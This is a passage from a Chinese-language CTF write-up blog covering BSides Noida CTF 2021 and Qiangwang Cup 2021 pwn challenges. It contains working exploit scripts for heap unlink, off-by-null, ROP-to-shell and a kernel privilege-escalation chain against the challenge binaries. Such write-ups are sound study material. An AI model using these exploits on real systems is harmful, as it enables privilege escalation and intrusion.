SEEK_SET)); read(fd, buffer, 0x60); long long canary = u64(buffer+1); long long base = commit_creds - 0xcbdd0; long long gadget1 = 0xffffffff8104dec1; long long gadget2 = 0xffffffff8110f940; // long long iret = 0xffffffff81039a1b; // long long swapgs = 0xffffffff81c00aaf; long long pop_rsp_ret = 0xffffffff81020360; long long swapgs_and_iret = 0xffffffff81c00a4a; // 0x0000000000000730 : pop rdi ; ret // 0x00000000003d5380 : xchg rax, rdi ; ret // 0x00000000000064ed : pop rsp ; ret // printf(\"[*] %d\\n\", lseek(fd, 0, SEEK_SET)); memset(mem, '\\x00', 0x100); mem[0x100] = '\\n'; int i=0; long long *ropchain = (long long *)(mem+0x30); ropchain[i++] = canary; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = pop_rsp_ret; ropchain[i++] = 0xd00; init_tf_work(); ropchain = (long long *)(mem + 0xd00); i = 0; ropchain[i++] = gadget1; ropchain[i++] = 0; ropchain[i++] = prepare_kernel_cred; ropchain[i++] = gadget2; ropchain[i++] = 0; ropchain[i++] = commit_creds; ropchain[i++] = swapgs_and_iret; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = \u0026get_shell; ropchain[i++] = tf.cs; // tf.cs, tf.ss, tf.eflags, tf.rsp ropchain[i++] = tf.eflags; ropchain[i++] = tf.rsp; ropchain[i++] = tf.ss; ropchain[i++] = 10; read(exp_fd, buffer, 0x60); // system(\"/","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:3:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"baby_musl 给的是docker，看一下dockerfile，server就是拿ubuntu2004直接apt装的musl #sudo docker build . -t test_chall#sudo docker run -d -p 1024:1024 --rm -it test_challFROMubuntu:20.04RUN useradd -d /home/ctf/ -m -p ctf -s /bin/bash ctfRUN echo \"ctf:ctf\" | chpasswdWORKDIR/home/ctfCOPY baby_musl .COPY flag.txt .COPY ynetd .RUN chown -R root:root /home/ctfRUN apt-get update \u0026\u0026 apt-get -y dist-upgrade \u0026\u0026 apt-get -y install muslUSERctfEXPOSE1024CMD ./ynetd -p 1024 ./baby_musl 所以本地就拿2004做就行，musl libc版本信息如下 musl libc (x86_64) Version 1.1.24 Dynamic Program Loader Usage: /lib/x86_64-linux-musl/libc.so [options] [--] pathname [args] musl堆题，保护全开，有两个洞。 前面add的时候要求idx\u003c4，但show没检查idx unsigned __int64 show() { __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); puts((const char *)chunks[v1]); return __readfsqword(0x28u) ^ v2; 而chunk和size又是挨在一起的，向size处填充地址，在show的时候将其解析为地址，实现任意地址读。 .bss:0000000000202040 ; _QWORD chunks[4] .bss:0000000000202040 chunks dq 4 dup(?) ; DATA XREF: new+7B↑o .bss:0000000000202040 ; del+51↑o ... .bss:0000000000202060 public data .bss:0000000000202060 ; _DWORD data[4] .bss:0000000000202060 data dd 4 dup(?) ; DATA XREF: new+98↑o .bss:0000000000202060 ; edit+79↑o .bss:0000000000202060 _bss ends free的时候也没有清空指针 unsigned __int64 del() { unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); if ( v1 \u003c= 3 \u0026\u0026 chunks[v1] ) free((void *)chunks[v1]); return __readfsqword(0x28u) ^ v2; } 这里简单总结一下musl与glibc的堆管理区别： musl没有hook musl作为轻量级libc，在分配堆块时会首先考虑libc上的空闲页，不会直接开在heap段上，但这样也使得堆上到处都是libc地址。 musl类似于只有smallbin和largebin，一般unlink是十分奏效的利用方式 最后思路为：堆上拿到残留的libc地址，利用任意地址读environ拿到栈地址，再在栈上拿到elf加载地址。unlink打到bss段堆指针，实现任意地址写，最后写rop即可。 \"\"\" x1do0 / Lilac \"\"\" from pwn import * def choice(ch): io.sendlineafter(\"[4] Show\\n\", str(ch)) def new(idx, size): choice(1) io.sendlineafter(\"Enter index\", str(idx)) io.sendlineafter(\"Enter size\", str(size)) def remove(idx): choice(2) io.sendlineafter(\"Enter index\", str(idx)) def edit(idx, con): choice(3) io.sendlineafter(\"Enter index\", str(idx)) io.sendafter(\"Enter data\", con) def show(idx): choice(4) io.sendlineafter(\"Enter index\", str(idx)) context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] # b *0xA25+0x555555554000 del # b *0x988+0x555555554000 add debug = \"\"\" b *0xC31+0x555555554000 set $data = 0x202040 + 0x555555554000 \"\"\" # debug = '' io = process(\"./baby_musl\") # gdb.attach(io, debug) io.sendafter(\"Enter your name\", 'xd') elf = ELF(\"./baby_musl\") libc = elf.libc new(0, 0x10) new(1, 0x30) remove(0) show(0) io.recvuntil(\"\\n\") libc.address = u64(io.recv(6) + b'\\x00\\x00') - 0xb0a40 print(hex(libc.address)) stack = libc.sym['environ'] print(hex(stack)) new(2, stack \u0026 0xffffffff) new(3, stack \u003e\u003e 32) show(5) io.recvuntil(\"\\n\") stack_addr = u64(io.recv(6) + b'\\x00\\x00') - 0xb0a40 print(hex(stack_addr)) target = stack_addr + 0xb09f0 print(hex(target)) elf_addr = target + 0x30 new(2, elf_addr \u0026 0xffffffff) new(3, elf_addr \u003e\u003e 32) show(5) io.recvuntil(\"\\n\") elf_base = u64(io.recv(6) + b'\\x00\\x00') - 0x796 print(hex(elf_base)) new(0, 0x80) remove(0) edit(0, p64(elf_base + 0x202040-0x18) + p64(elf_base + 0x202040 - 0x10)) new(1, 0x80) # new(2, 0x10) system = libc.sym['system'] binsh = next(libc.search(b\"/bin/sh\")) pop_rdi_ret = libc.address + 0x0000000000015291 edit(0, p64(target)*3) edit(0, p64(pop_rdi_ret) + p64(binsh) + p64(system)) choice(666) io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:4:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"teensum 草 直球栈溢出，这题没人做？ 给了docker和libc，实际上就是ubuntu20.04，libc也没做什么手脚。 x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum /lib/x86_64-linux-gnu/libc-2.31.so d371da546786965fe0ee40147ffef716 /lib/x86_64-linux-gnu/libc-2.31.so x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum libc.so.6 d371da546786965fe0ee40147ffef716 libc.so.6 开了pie，但是栈上本来就有残留地址，直接日就完事了。 \"\"\" x1do0 / Lilac \"\"\" from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] io = process(\"./teen-sum\", aslr=False) # gdb.attach(io, \"b *0x138B+0x555555554000\") libc = ELF(\"./libc.so.6\") io.sendlineafter(\"\u003e \", str(0xa0)) io.sendafter(\"\u003e \", '\\n') io.recvuntil(\"Hey \") libc_base = u64(io.recv(6) + b'\\x00\\x00') - 0x227e0a print(hex(libc_base)) io.sendlineafter(\"How many?\", str(1)) io.sendlineafter(\"Please enter them one by one.\", str(1)) io.sendlineafter(\"1. Yes\", str(1)) io.sendlineafter(\"New size please.\u003e\", str(0x100)) prdir = libc_base + 0x0000000000026b72 # pop rdi ; ret system = libc_base + libc.sym['system'] binsh = libc_base + next(libc.search(b\"/bin/sh\")) empty_ret = libc_base + 0x0000000000025679 rop = flat(empty_ret, prdir, binsh, system) io.sendlineafter(\"New Name please ^.^ :\", b'a'*0x38 + p64(0x100) + b'a'*8 + rop) io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:5:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"suscall 题目提供了一个任意函数执行的漏洞系统调用，把reboot关了跑一下。妈的直接暴毙 [ 0.033687] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline [ 0.100000] ..MP-BIOS bug: 8254 timer not connected to IO-APIC [ 0.430283] Kernel panic - not syncing: Out of memory and no killable processes... [ 0.430283] [ 0.430627] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.4.271 #8 [ 0.430804] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014 [ 0.431059] 0000000000000000 ffff8800028eb928 ffffffff834bbc18 ffffffff837ac6e0 [ 0.431104] ffff8800028eb9b8 ffff8800028eb9a8 ffffffff834bab4f 0000000000000008 [ 0.431104] ffff8800028eb9b8 ffff8800028eb950 6170203035373032 0000000000000246 [ 0.431104] Call Trace: [ 0.431104] [\u003cffffffff834bbc18\u003e] dump_stack+0x57/0x6d [ 0.431104] [\u003cffffffff834bab4f\u003e] panic+0xb9/0x1fd [ 0.431104] [\u003cffffffff82d21aa3\u003e] out_of_memory+0x423/0x490 [ 0.431104] [\u003cffffffff82d27412\u003e] __alloc_pages_nodemask+0xa62/0xa90 [ 0.431104] [\u003cffffffff82d2bc8b\u003e] ? release_pages+0x8b/0x1f0 [ 0.431104] [\u003cffffffff82d63cee\u003e] alloc_page_interleave+0x3e/0x90 [ 0.431104] [\u003cffffffff82d641a4\u003e] alloc_pages_current+0xb4/0x110 [ 0.431104] [\u003cffffffff82d1dc58\u003e] __page_cache_alloc+0xb8/0xe0 [ 0.431104] [\u003cffffffff82d1e868\u003e] pagecache_get_page+0x88/0x1b0 [ 0.431104] [\u003cffffffff82d1e9b4\u003e] grab_cache_page_write_begin+0x24/0x40 [ 0.431104] [\u003cffffffff82d98ce4\u003e] simple_write_begin+0x24/0x190 [ 0.431104] [\u003cffffffff82d1e193\u003e] generic_perform_write+0xb3/0x1a0 [ 0.431104] [\u003cffffffff834c2fed\u003e] ? down_write+0xd/0x40 [ 0.431104] [\u003cffffffff82d1f4e4\u003e] __generic_file_write_iter+0x104/0x1b0 [ 0.431104] [\u003cffffffff82d1f669\u003e] generic_file_write_iter+0xd9/0x200 [ 0.431104] [\u003cffffffff83b3c795\u003e] ? initcall_blacklist+0xaa/0xaa [ 0.431104] [\u003cffffffff82d728f0\u003e] __vfs_write+0xb0/0xe0 [ 0.431104] [\u003cffffffff82d73301\u003e] vfs_write+0x91/0x180 [ 0.431104] [\u003cffffffff83b3c795\u003e] ? initcall_blacklist+0xaa/0xaa [ 0.431104] [\u003cffffffff82d73f14\u003e] SyS_write+0x44/0xb0 [ 0.431104] [\u003cffffffff83b3e11d\u003e] xwrite+0x29/0x5c [ 0.431104] [\u003cffffffff83b3de5b\u003e] ? md_run_setup+0x94/0x94 [ 0.431104] [\u003cffffffff83b3e706\u003e] do_copy+0x29/0xb6 [ 0.431104] [\u003cffffffff83b3defc\u003e] write_buffer+0x26/0x37 [ 0.431104] [\u003cffffffff83b3e560\u003e] unpack_to_rootfs+0xf2/0x26f [ 0.431104] [\u003cffffffff83b3e8a0\u003e] ? maybe_link.part.4+0x10d/0x10d [ 0.431104] [\u003cffffffff83b3e8fc\u003e] populate_rootfs+0x5c/0x108 [ 0.431104] [\u003cffffffff82c003b7\u003e] do_one_initcall+0x87/0x1a0 [ 0.431104] [\u003cffffffff83b3cfa7\u003e] kernel_init_freeable+0x159/0x1ec [ 0.431104] [\u003cffffffff834bf4d0\u003e] ? rest_init+0x80/0x80 [ 0.431104] [\u003cffffffff834bf4d9\u003e] kernel_init+0x9/0xe0 [ 0.431104] [\u003cffffffff834c4ed5\u003e] ret_from_fork+0x55/0x80 [ 0.431104] [\u003cffffffff834bf4d0\u003e] ? rest_init+0x80/0x80 [ 0.431104] Rebooting in 1 seconds.. 看了一眼发现开完gzip太大了，所以启动脚本还是不能直接打包成cpio就送进去。顺便改了一下题目启动脚本（甚至有错别字） 这是题目给的脚本，paneic=1是什么鬼？ qemu-system-x86_64 -m 128M -initrd initramfs.cpio -kernel ./bzImage -nographic -monitor /dev/null -append \"kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet\" -s 2\u003e/dev/null 改了一下，能跑了 #!/bin/bash gcc exp.c -static -masm=intel -fno-stack-protector -o exploit # gcc -o exp -static -fno-stack-protector -DREMOTE -nostdlib poc.c cp exp files/ cd files find . | cpio -o --format=newc \u003e ../rootfs.cpio cd .. gzip rootfs.cpio read input if [ \"$input\" == \"y\" ]; then echo 'wrong' exit fi qemu-system-x86_64 -m 128M -initrd rootfs.cpio.gz \\ -no-reboot \\ -kernel ./bzImage -nographic -monitor /dev/null \\ -append \"kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet\" -s 开了kaslr，但是并没有开kptr_restrict / $ cat /proc/sys/kernel/kptr_restrict 0 / $ cat /proc/sys/kernel/perf_event_paranoid 1 所以每次读出来地址就行，然后调用它的syscall在内核态拿到root /* x1do0 / Lilac */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/syscall.h\u003e#include \u003cunistd.h\u003e #define __NR_SUSCALL 546 #define KERNCALL __attribute__((regparm(3))) void* (*prepare_kernel_cred)(void*) KERNCALL = 0; void* (*commit_creds)(void*) KERNCALL = 0; void get_root(){ commit_creds(prepare_kernel_cred(0))","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:6:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"trash 直接给了堆地址，用于绕过2.32的异或检测。 C++堆，用allocator开的堆，但并没有考常规c++析构函数的double free，而是一个明显的off-by-null。 __int64 __fastcall sub_26A3(_QWORD *a1) { char v1; // bl int v3; // [rsp+18h] [rbp-18h] int i; // [rsp+1Ch] [rbp-14h] v3 = -1; for ( i = 0; i \u003c (unsigned __int64)get_len(a1); ++i ) { v1 = getchar(); *(_BYTE *)check_add(a1, i) = v1; if ( *(_BYTE *)check_add(a1, i) == '\\n' ) { v3 = i + 1; break; } v3 = i + 1; } *(_BYTE *)no_check_add(a1, v3) = 0; // off-by-null return (unsigned int)v3; 但这个'\\x00’也导致了后续利用的困难，因为打印函数会在此截断。 __int64 __fastcall sub_275A(__int64 a1) { char *v1; // rax int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; *(_BYTE *)check_add(a1, i); ++i ) { v1 = (char *)check_add(a1, i); std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, (unsigned int)*v1); } return std::ostream::operator\u003c\u003c(\u0026std::cout, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); } 总的来说这题比较麻烦的点在于： 所有的读入后面都会添加\\x00，同时\\n也会读入 没有free，只有类似于realloc改变大小时顺带的free 开了sandbox，只能orw glibc2.32 在输入堆地址时记得mask一下 令人痛心的是，新版本的setcontext已经不用rdi了，导致只能rop Dump of assembler code for function setcontext: 0x000015555517b0a0 \u003c+0\u003e: endbr64 0x000015555517b0a4 \u003c+4\u003e: push rdi 0x000015555517b0a5 \u003c+5\u003e: lea rsi,[rdi+0x128] 0x000015555517b0ac \u003c+12\u003e: xor edx,edx 0x000015555517b0ae \u003c+14\u003e: mov edi,0x2 0x000015555517b0b3 \u003c+19\u003e: mov r10d,0x8 0x000015555517b0b9 \u003c+25\u003e: mov eax,0xe 0x000015555517b0be \u003c+30\u003e: syscall 0x000015555517b0c0 \u003c+32\u003e: pop rdx 0x000015555517b0c1 \u003c+33\u003e: cmp rax,0xfffffffffffff001 0x000015555517b0c7 \u003c+39\u003e: jae 0x15555517b1ef \u003csetcontext+335\u003e 0x000015555517b0cd \u003c+45\u003e: mov rcx,QWORD PTR [rdx+0xe0] 0x000015555517b0d4 \u003c+52\u003e: fldenv [rcx] 0x000015555517b0d6 \u003c+54\u003e: ldmxcsr DWORD PTR [rdx+0x1c0] 0x000015555517b0dd \u003c+61\u003e: mov rsp,QWORD PTR [rdx+0xa0] 0x000015555517b0e4 \u003c+68\u003e: mov rbx,QWORD PTR [rdx+0x80] 0x000015555517b0eb \u003c+75\u003e: mov rbp,QWORD PTR [rdx+0x78] 0x000015555517b0ef \u003c+79\u003e: mov r12,QWORD PTR [rdx+0x48] 0x000015555517b0f3 \u003c+83\u003e: mov r13,QWORD PTR [rdx+0x50] 0x000015555517b0f7 \u003c+87\u003e: mov r14,QWORD PTR [rdx+0x58] 0x000015555517b0fb \u003c+91\u003e: mov r15,QWORD PTR [rdx+0x60] 0x000015555517b0ff \u003c+95\u003e: test DWORD PTR fs:0x48,0x2 所以核心思路是off-by-null使chunk的inuse位置0，标志着前一个chunk使空闲的，导致在free当前chunk时触发unlink向前合并。在前一个块精心布局绕过unlink检查，我们就可以向前合并导致堆块重叠。可以直接动态调试绕过unlink检测。 0x1555551bba41 \u003cunlink_chunk.isra+33\u003e cmp rdi, qword ptr [rax + 0x18] 0x1555551bba45 \u003cunlink_chunk.isra+37\u003e jne unlink_chunk.isra+160 \u003cunlink_chunk.isra+160\u003e ► 0x1555551bba47 \u003cunlink_chunk.isra+39\u003e cmp rdi, qword ptr [rdx + 0x10] 0x1555551bba4b \u003cunlink_chunk.isra+43\u003e jne unlink_chunk.isra+160 \u003cunlink_chunk.isra+160\u003e 0x1555551bbac0 \u003cunlink_chunk.isra+160\u003e lea rdi, [rip + 0x11f990] 0x1555551bbac7 \u003cunlink_chunk.isra+167\u003e call malloc_printerr \u003cmalloc_printerr\u003e # unlink 出错 堆块合并拿到libc基址后，直接分配到environ去泄露stack地址，还是因为有个\\x00 看来还得打stdout拿到栈地址，我们知道在IO FILE的flag为某些值时write_base到write_end会打印出来。所以打到stdout，利用write_base拿到栈地址。然后去做栈溢出。 这里发现stdout本身的flag不对，还得从头开始改，这样如果只改一半它在刚分配过去的时候会全部清零引发错误，所以必须得足够大的块一次性把整个stdout伪造出来(只把write指针全改也不行) exp2.31，加上mask异或就能打远程。总的来说细节还是比较繁琐。 \"\"\" x1do0 / Lilac \"\"\" from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') # context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] def choice(ch): io.sendlineafter(\"\u003e \", str(ch)) def add(idx, size, con): choice(1) io.sendlineafter(\"Trashcan no.: \", str(idx)) io.sendlineafter(\"Size of your trash: \", str(size)) io.sendafter(\"Your trash: \", con) def change_size(idx, size): choice(2) io.sendlineafter(\"Trashcan no.: \", str(idx)) io.sendlineafter(\"Size of new trashcan:\", str(size)) def show(idx): choice(3) io.sendlineafter(\"Trashcan no.: \", str(idx)) debug = \"\" # debug += \"b *0x43BB + 0x555555554000\" # debug += \"\\nset $data=0x55555555d4d0\" # debug += \"\\nb *0x1555551bba41\" # unlink check debug += \"\\nb *0x46E5 + 0x555555554000\" io = process(\"./a.out\") choice(0x7A69) io.recvuntil(\"what happened\\n\") heap_addr = int(io.recv(14), 16) print('[*] heap addr : ' + hex(heap_addr)) add(0, 0x78, 'a\\n') add(2, 0x18, 'c\\n') add(12, 0x58, 'd\\n') add(1, 0xf8, 'b\\n') change_size(0,","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:7:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"Interpreter C++实现的vmpwn，逆指令就完事了。 op reg1 [reg2] [reg3] opcode operations c ip+=2, r ip+=3, byte v13[reg1] = byte v14[ short v13[reg2] ] w ip+=3, byte v14[ short v13[reg1] ] = byte v13[reg2] a ip+=4, byte v13[reg1] = byte v13[reg2] + byte v13[reg3] d ip+=4, byte v13[reg1] = short v13[reg2] / short v13[reg3] m ip+=4, byte v13[reg1] = byte v13[reg2] * byte v13[reg3] s ip+=4, byte v13[reg1] = byte v13[reg2] - byte v13[reg3] 在解析指令时有明显的逻辑漏洞，本意是只有0-3个寄存器，但是只要不都大于3就不会报错 opcode = code[currentIP] | 0x20; _reg2 = currentIP + 2; reg1 = code[currentIP + 1] - 0x30; if ( opcode == 'c' ) { currentIP += 2; } else { v10 = currentIP + 3; reg2 = code[_reg2] - '0'; if ( opcode != 'r' \u0026\u0026 opcode != 'w' ) { currentIP += 4; reg3 = code[v10] - '0'; } else { currentIP += 3; } if ( (unsigned __int8)(code[_reg2] - '0') \u003e 3u \u0026\u0026 reg1 \u003e 3u \u0026\u0026 reg3 \u003e 3u )// opcode \u003c=3 \u003c=3 \u003c=3 { // 逻辑漏洞 std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cerr, \"Invalid Register\\n\"); exit(-1); } } 所以能以v13为base，以任意一字节为offset，进行读写等操作。 __int64 __fastcall main_core(const char *code) { int code_len; // er15 unsigned __int8 reg3; // r13 char reg2; // r14 char v5; // cl int currentIP; // ebp char opcode; // al int _reg2; // esi unsigned __int8 reg1; // bl int v10; // edi int i; // edx __int64 v13; // [rsp+8h] [rbp-A0h] __int64 v14[7]; // [rsp+10h] [rbp-98h] int v15; // [rsp+48h] [rbp-60h] char v16[24]; // [rsp+50h] [rbp-58h] BYREF unsigned __int64 v17; // [rsp+68h] [rbp-40h] 把v14改成3p1cl337-k3yw0rd就能拿到re的flag（flag1.txt） pwn题要求拿到flag2.txt，在函数sub_2B47()，c++很难辨认，但是还是能依稀看出open了flag2.txt，并且该函数没有被任何函数调用。 unsigned __int64 sub_2B47() { std::ostream *v0; // rbx char *v1; // rcx _BYTE *v2; // rbp char v3; // si std::ostream *v4; // rax void *v6; // [rsp+0h] [rbp-248h] BYREF __int64 v7; // [rsp+8h] [rbp-240h] __int64 v8[2]; // [rsp+10h] [rbp-238h] BYREF int *v9; // [rsp+20h] [rbp-228h] BYREF __int64 v10; // [rsp+28h] [rbp-220h] __int64 v11[7]; // [rsp+30h] [rbp-218h] BYREF char v12[48]; // [rsp+68h] [rbp-1E0h] BYREF char v13[136]; // [rsp+98h] [rbp-1B0h] BYREF __int64 v14[28]; // [rsp+120h] [rbp-128h] BYREF char v15; // [rsp+200h] [rbp-48h] char v16; // [rsp+201h] [rbp-47h] __int64 v17; // [rsp+208h] [rbp-40h] __int64 v18; // [rsp+210h] [rbp-38h] __int64 v19; // [rsp+218h] [rbp-30h] __int64 v20; // [rsp+220h] [rbp-28h] unsigned __int64 v21; // [rsp+228h] [rbp-20h] v21 = __readfsqword(0x28u); std::__ostream_insert\u003cchar,std::char_traits\u003cchar\u003e\u003e(std::cout, \"Nice Job\\n\", 9LL); std::ios_base::ios_base((std::ios_base *)v14); v14[0] = (__int64)\u0026unk_4C40; v14[27] = 0LL; v15 = 0; v16 = 0; v17 = 0LL; v18 = 0LL; v19 = 0LL; v20 = 0LL; v9 = \u0026dword_0; *(int **)((char *)\u0026v9 + MEMORY[0xFFFFFFFFFFFFFFE8]) = \u0026dword_0; v10 = 0LL; std::ios::init((char *)\u0026v9 + *((_QWORD *)v9 - 3), 0LL); v9 = (int *)\u0026unk_4CE8; v14[0] = (__int64)\u0026unk_4CE8 + 40; std::filebuf::basic_filebuf(v11); std::ios::init(v14, v11); if ( std::filebuf::open(v11, \"flag2.txt\", 8LL) ) std::ios::clear((char *)\u0026v9 + *((_QWORD *)v9 - 3), 0LL); else std::ios::clear((char *)\u0026v9 + *((_QWORD *)v9 - 3), *(_DWORD *)((char *)\u0026v9 + *((_QWORD *)v9 - 3) + 32) | 4u); v6 = v8; v7 = 0LL; LOBYTE(v8[0]) = 0; std::operator\u003e\u003e\u003cchar\u003e(\u0026v9, \u0026v6); std::__ostream_insert\u003cchar,std::char_traits\u003cchar\u003e\u003e(std::cout, \"Here's your second reward : \", 28LL); v0 = (std::ostream *)std::__ostream_insert\u003cchar,std::char_traits\u003cchar\u003e\u003e(std::cout, v6, v7); v1 = (char *)v0 + *(_QWORD *)(*(_QWORD *)v0 - 24LL); v2 = (_BYTE *)*((_QWORD *)v1 + 30); if ( !v2 ) std::__throw_bad_cast(); if ( v2[56] ) { v3 = v2[67]; } else { std::ctype\u003cchar\u003e::_M_widen_init(*((_QWORD *)v1 + 30)); v3 = (*(__int64 (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)v2 + 48LL))(v2, 10LL); } v4 = (std::ostream *)std::ostream::put(v0, v3); std::ostream::flush(v4); if ( v6 != v8 ) operator delete(v6, v8[0] + 1); v9 = (int *)\u0026unk_4CE8; v14[0] = (__int64)\u0026unk_4CE8 + 40; v11[0] = (__int64)\u0026unk_4D30; std::filebuf::close(v11); std::__basic_file\u003cchar\u003e::~__basic_file(v13); v11[0] = (__int64)\u0026unk_4C60; std::locale::~locale((std::locale *)v12); v9 = ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:8:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"国内最受瞩目的比赛之一，拥有几乎最高的PWN/realworld赛题质量。 比赛时看了几道cold down, EXSI找到了洞但是不好复现… easy_go vmnote s2a 强网先锋 EXSI (Real World) rank 3 with AAA ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:0:0","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"强网先锋 详见前文 ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:1:0","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"easy_go ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:0","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"overall 栈上有明显的off-by-null漏洞，可以修改rbp的低字节，通过两次leave ret来做stack-pivot. __int64 __fastcall sub_4015AB(__int64 a1, int a2) //vul_read() { unsigned int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; (int)i \u003c a2; ++i ) { if ( read(0, (void *)((int)i + a1), 1uLL) \u003c= 0 ) { puts(\"read error\"); exit(0); } if ( *(_BYTE *)((int)i + a1) == 10 ) break; } *(_BYTE *)((int)i + a1) = 0; // off-by-one return i; } 同时题目开启sandbox，只允许orw x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ seccomp-tools dump ./easy_go line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0018: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0020: 0x06 0x00 0x00 0x00000000 return KILL ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:1","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Tips 赛题环境ubuntu20.04，建议同版本调试 x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ diff /usr/lib/x86_64-linux-gnu/libc-2.31.so ./libc-2.31.so x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ 调试时别忘了打开系统aslr ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:2","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Details 由于栈随机化现象，需要多尝试几次，在某一次可以跑到如下RSP与RBP，看到RBP正好成了用户可控区域。 此时直接调用vul_read()，十分幸运地是此时rdi与rsi都是合法的，同时rdi正好在当前栈附件，rsi也足够大。 ────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────── RAX 0x0 RBX 0x401740 ◂— endbr64 RCX 0x0 RDX 0xa RDI 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0 RSI 0x7fa550e463c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002 R8 0x7fa550e934a0 (_nl_global_locale) —▸ 0x7fa550e8f6c0 (_nl_C_LC_CTYPE) —▸ 0x7fa550e5ffc6 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */ R9 0x18 R10 0x402061 ◂— 'continue?(0:no, 1:yes): ' R11 0x246 R12 0x401190 ◂— endbr64 R13 0x7ffce71cf730 ◂— 0x1 R14 0x0 R15 0x0 RBP 0x404800 ◂— 0x0 *RSP 0x7ffce71cf610 —▸ 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0 *RIP 0x40168d ◂— call 0x4015ab ─────────────────────────────────────────────────────────────────[ DISASM 